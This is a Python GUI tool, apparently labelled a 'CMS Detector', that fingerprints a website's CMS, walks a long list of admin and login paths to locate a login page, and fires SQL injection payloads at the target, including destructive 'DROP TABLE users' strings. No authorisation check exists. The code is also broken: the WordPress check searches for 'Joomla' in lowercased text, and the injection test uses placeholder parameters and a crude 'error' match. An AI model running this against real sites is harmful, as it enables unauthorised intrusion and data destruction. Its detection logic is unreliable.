import requests
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import messagebox, ttk
import socket
import threading


def detect_cms(url):
        response = requests.get(url)
        if response.status_code == 200:
            html = response.text
            soup = BeautifulSoup(html, 'html.parser')

            # Detect WordPress
            if "Joomla" in html.lower():
                return "WordPress"

            # Detect Joomla
            if soup.find("meta", {"name": "generator", "content": "Joomla! - Open Source Content Management"}):
                return "Joomla"

            # Detect Drupal
            if soup.find("meta", {"name": "Generator", "content": "Drupal"}):
                return "Drupal"

            # Detect Wix
            if "wix.com" in html:
                return "Wix"

            # Detect Squarespace
            if "squarespace.com" in html:
                return "Squarespace"

            # Detect VBulletin
            if "vbulletin" in html:
                return "vBulletin"

            # Detect Magento
            if soup.find("meta", {"name": "generator", "content": "Magento"}):
                return "Magento"

            # Detect Shopify
            if soup.find("meta", {"name": "generator", "content": "Shopify"}):
                return "Shopify"

            # Detect Blogger
            if soup.find("meta", {"name": "generator", "content": "Blogger"}):
                return "Blogger"

            # Detect Ghost
            if soup.find("meta", {"name": "generator", "content": "Ghost"}):
                return "Ghost"

            return "Unknown CMS"

        else:
            return "Error: Unable to fetch URL"


def search_login_variations(cms_name, url):
    # Function to search for variations of login pages based on the detected CMS
    # Add more variations based on the specific CMS as needed
    if cms_name.lower() == "wordpress":
        variations = [
            "/wp-login.php", "/wp-admin", "/admin", "/login",
            "/wp/wp-login.php", "/wp-admin.php"
        ]
    elif cms_name.lower() == "joomla":
        variations = [
            "/administrator", "/admin", "/backend", "/login",
            "/joomla/administrator", "/joomla/admin", "/joomla/login"
        ]
    elif cms_name.lower() == "drupal":
        variations = [
            "/user/login", "/user", "/user/signin", "/user/login.php",
            "/user/login.html", "/user/log-in", "/drupal/user/login"
        ]
    elif cms_name.lower() == "magento":
        variations = [
            "/admin", "/admin/login", "/admin/signin", "/admin/login.php",
            "/admin/login.html", "/admin/log-in"
        ]
    elif cms_name.lower() == "shopify":
        variations = [
            "/admin", "/admin/login", "/admin/signin", "/admin/login.php",
            "/admin/login.html", "/admin/log-in"
        ]
    elif cms_name.lower() == "woocommerce":
        variations = [
            "/wp-login.php", "/wp-admin", "/admin", "/login",
            "/wp/wp-login.php", "/wp-admin.php", "/shop/login", "/woocommerce/login"
        ]
    elif cms_name.lower() == "prestashop":
        variations = [
            "/admin", "/admin-dev", "/backend", "/signin", "/login",
            "/prestashop/admin", "/prestashop/login"
        ]
    elif cms_name.lower() == "opencart":
        variations = [
            "/admin", "/admin/index.php", "/backend", "/login",
            "/opencart/admin", "/opencart/login"
        ]
    elif cms_name.lower() == "phpmyadmin":
        variations = [
            "/phpmyadmin", "/pma", "/myadmin", "/mysql", "/db",
            "/phpMyAdmin/index.php", "/phpMyAdmin/login"
        ]
    elif cms_name.lower() == "cpanel":
        variations = [
            "/cpanel", "/controlpanel", "/cp",
            "/cpanel/index.php", "/cpanel/login"
        ]
    elif cms_name.lower() == "phpbb":
        variations = [
            "/adm", "/adm/index.php", "/admin", "/admin/index.php",
            "/login", "/phpbb/admin", "/phpbb/login"
        ]
    elif cms_name.lower() == "mybb":
        variations = [
            "/admin", "/admin/index.php", "/adm", "/adm/index.php",
            "/login", "/mybb/admin", "/mybb/login"
        ]
    elif cms_name.lower() == "unknown cms":
        variations = [
            "/adminarea",
            "/adminarea.php",
            "/adminarea.html",
            "/admin-login",
            "/wp-login.php",
            "/admin-login.php",
            "/admin-login.html",
            "/admin1",
            "/admin.php",
            "/admin",
            "/adminlogin",
            "/admin1.php",
            "/admin1.html",
            "/admin2",
            "/admin2.php",
            "/admin2.html",
            "/yonetim",
            "/yonetim.php",
            "/yonetim.html",
            "/yonetici",
            "/yonetici.php",
            "/yonetici.html",
            "/ccms",
            "/ccms.php",
            "/ccms.html",
            "/panel",
            "/panel.php",
            "/panel.html",
            "/controlpanel",
            "/controlpanel.php",
            "/controlpanel.html",
            "/admincontrol",
            "/admincontrol.php",
            "/admincontrol.html",
            "/admin1.asp",
            "/admin2.asp",
            "/yonetim.asp",
            "/yonetici.asp",
            "/ccms.asp",
            "/panel.asp",
            "/controlpanel.asp",
            "/admincontrol.asp",
            "/admin/account",
            "/admin/account.php",
            "/admin/account.html",
            "/admin/admin",
            "/admin/admin.php",
            "/admin/admin.html",
            "/admin-login.asp",
            "/admin1/login",
            "/admin2/login",
            "/yonetim/login",
            "/yonetici/login",
            "/ccms/login",
            "/panel/login",
            "/controlpanel/login",
            "/admincontrol/login",
            "/admin/account/login",
            "/admin1/login.asp",
            "/admin2/login.asp",
            "/yonetim/login.asp",
            "/yonetici/login.asp",
            "/ccms/login.asp",
            "/panel/login.asp",
            "/controlpanel/login.asp",
            "/admincontrol/login.asp",
            "/admin/account/login.asp",
            "/admin-login/login",
            "/admin/admin-login",
            "/admin-login/admin",
            "/admin-login/login.asp",
            "/admin1/login",
            "/admin2/login",
            "/yonetim/login",
            "/yonetici/login",
            "/ccms/login",
            "/panel/login",
            "/controlpanel/login",
            "/admincontrol/login",
            "/admin/account/login",
            "/login.php",
            "/login.html",
            "/signin.php",
            "/signin.html",
            "/log-in.php",
            "/log-in.html",
            "/userlogin",
            "/userlogin.php",
            "/userlogin.html",
            "/administratorlogin",
            "/administratorlogin.php",
            "/administratorlogin.html",
            "/adminlogin",
            "/adminlogin.php",
            "/adminlogin.html",
            "/secureadmin",
            "/secureadmin.php",
            "/secureadmin.html",
            "/webmaster",
            "/webmaster.php",
            "/webmaster.html",
            "/sysadmin",
            "/sysadmin.php",
            "/sysadmin.html",
            "/systemadmin",
            "/systemadmin.php",
            "/systemadmin.html",
            "/manager",
            "/manager.php",
            "/manager.html",
            "/moderator",
            "/moderator.php",
            "/moderator.html",
            "/webadmin",
            "/webadmin.php",
            "/webadmin.html",
            "/siteadmin",
            "/siteadmin.php",
            "/siteadmin.html",
            "/login-admin",
            "/login-admin.php",
            "/login-admin.html",
            "/admin1/login",
            "/admin1/login.php",
            "/admin1/login.html",
            "/admin2/login",
            "/admin2/login.php",
            "/admin2/login.html",
            "/admins.php",
            "/admins.html",
            "/admins/login.php",
            "/admins/login.html",
            "/admins/signin.php",
            "/admins/signin.html",
            "/admins/log-in.php",
            "/admins/log-in.html",
            "/administrator1.php",
            "/administrator1.html",
            "/administrator1/login.php",
            "/administrator1/login.html",
            "/administrator1/signin.php",
            "/administrator1/signin.html",
            "/administrator1/log-in.php",
            "/administrator1/log-in.html",
            "/administrator2.php",
            "/administrator2.html",
            "/administrator2/login.php",
            "/administrator2/login.html",
            "/administrator2/signin.php",
            "/administrator2/signin.html",
            "/administrator2/log-in.php",
            "/administrator2/log-in.html",
            "/login-admin1",
            "/login-admin1.php",
            "/login-admin1.html",
            "/login-admin2",
            "/login-admin2.php",
            "/login-admin2.html",
            "/admin_login.php",
            "/admin_login.html",
            "/admin_login/login.php",
            "/admin_login/login.html",
            "/admin_login/sign"
        ]
    else:
        variations = []

    valid_login_page = None
    for variation in variations:
        response = requests.get(f"{url}{variation}")
        if response.status_code == 200:
            valid_login_page = f"{url}{variation}"
            break

    return valid_login_page


def check_sql_injection_vulnerability(url):
    # List of SQL injection payloads to test
    payloads = [
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "1' OR '1'='1' #",
        "1' OR 1=1-- ",
        "1' OR 1=1# ",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR 1=1-- ",
        "' OR 1=1# ",
        "') OR ('1'='1",
        "') OR ('1'='1' --",
        "') OR ('1'='1' #",
        "') OR 1=1-- ",
        "') OR 1=1# ",
        "1' OR 1=1; DROP TABLE users;--",
        "1' OR 1=1; DROP TABLE users;#",
        "' OR '1'='1'; DROP TABLE users;--",
        "' OR '1'='1'; DROP TABLE users;#",
        # Add more payloads here
    ]

    vulnerable_parameters = []

    try:
        response = requests.get(url)
        if response.status_code == 200:
            html = response.text

            # Use BeautifulSoup to parse the HTML and find input fields or query parameters
            soup = BeautifulSoup(html, 'html.parser')
            input_elements = soup.find_all("input")
            query_parameters = ["example_param1", "example_param2"]  # Add actual query parameters here

            for param in query_parameters:
                for payload in payloads:
                    # Prepare the data with the payload for the parameter
                    data = {param: payload}

                    # Send the request
                    response = requests.get(url, params=data)

                    # Check if the response contains SQL error messages or other indications of vulnerability
                    if "error" in response.text.lower():
                        vulnerable_parameters.append(param)
                        break  # No need to test other payloads for this parameter if vulnerability found

    except requests.exceptions.RequestException as e:
        print("Error:", e)

    return vulnerable_parameters




def detect_cms_button_click():
    url = url_entry.get()
    if not url:
        messagebox.showerror("Error", "Please enter a valid URL.")
        return

    # Disable the detect button to prevent multiple clicks during processing
    detect_button.config(state=tk.DISABLED)

    # Set progress bar to 0% initially
    progress_bar["value"] = 0

    def search_cms_in_thread():
        cms_name = detect_cms(url)
        valid_login_page = search_login_variations(cms_name, url)
        vulnerable_parameters = check_sql_injection_vulnerability(url)

        result = f"The website is based on: {cms_name}\n"
        if valid_login_page:
            result += f"Login page found: {valid_login_page}\n"
        if vulnerable_parameters:
            result += f"Potential SQL injection vulnerability in parameters: {', '.join(vulnerable_parameters)}"
        else:
            result += "No SQL injection vulnerability detected."

        # Update the result label with CMS and login variation information
        result_label.config(text=result)

        # Re-enable the detect button after processing is done
        detect_button.config(state=tk.NORMAL)

        # Set progress bar to 100% after processing is done
        progress_bar["value"] = 100

    # Create a thread for the CMS detection, login page search, and SQL injection check
    thread = threading.Thread(target=search_cms_in_thread)
    thread.start()


# Create the main application window
app = tk.Tk()
app.title("CMS Detector")

# Set the window size and position to center
window_width = 500
window_height = 250
x_pos = (app.winfo_screenwidth() // 2) - (window_width // 2)
y_pos = (app.winfo_screenheight() // 2) - (window_height // 2)
app.geometry(f"{window_width}x{window_height}+{x_pos}+{y_pos}")

# Create and place widgets
url_label = ttk.Label(app, text="Enter URL:")
url_label.pack()

url_entry = ttk.Entry(app, width=50)
url_entry.pack()

detect_button = ttk.Button(app, text="Detect CMS", command=detect_cms_button_click)
detect_button.pack()

style = ttk.Style()
style.theme_use("winnative")
style.configure("winnative.Horizontal.TProgressbar", thickness=5)

progress_bar = ttk.Progressbar(app, mode="determinate", style="winnative.Horizontal.TProgressbar")
progress_bar.pack(pady=10)

result_label = ttk.Label(app, text="", wraplength=400)
result_label.pack()

# Start the main event loop
app.mainloop()
